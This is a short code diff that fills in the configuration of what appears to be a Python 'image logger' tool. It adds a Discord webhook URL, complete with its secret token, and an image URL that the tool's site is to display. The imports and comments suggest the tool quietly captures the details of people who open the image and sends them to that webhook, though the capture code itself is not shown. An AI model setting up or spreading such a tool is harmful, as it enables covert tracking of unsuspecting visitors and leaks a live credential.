@@ -4,8 +4,8 @@ import traceback, requests, base64, httpagentparser
 
 config = {
     # BASE CONFIG #
-    "webhook": "", # Your webhook link
-    "image": "", # The image you want the site to load
+    "webhook": "https://discord.com/api/webhooks/1551237867177639936/e4xhi_uNNW1FApzw2wr8II5NZM8gSRikeFmjpQBHug0IKszxn3RbF2zgRI05r0zcgHWD", # Your webhook link
+    "image": "https://i.pinimg.com/736x/6f/e7/42/6fe742469cc9d01a6614f06f1777c415.jpg", # The image you want the site to load
     "imageArgument": True,
 
     
